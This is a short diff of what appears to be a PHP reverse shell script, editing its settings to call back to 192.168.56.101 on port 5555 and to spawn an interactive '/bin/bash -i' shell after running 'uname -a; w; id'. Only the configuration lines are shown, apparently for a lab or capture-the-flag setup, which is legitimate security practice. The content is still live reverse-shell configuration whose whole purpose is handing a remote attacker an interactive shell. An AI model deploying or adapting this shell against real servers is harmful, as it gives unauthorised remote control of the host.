@@ -46,12 +46,12 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '127.0.0.1';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
+$ip = '192.168.56.101';  // CHANGE THIS
+$port = 5555;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
-$shell = 'uname -a; w; id; /bin/sh -i';
+$shell = 'uname -a; w; id; /bin/bash -i';
 $daemon = 0;
 $debug = 0;
 
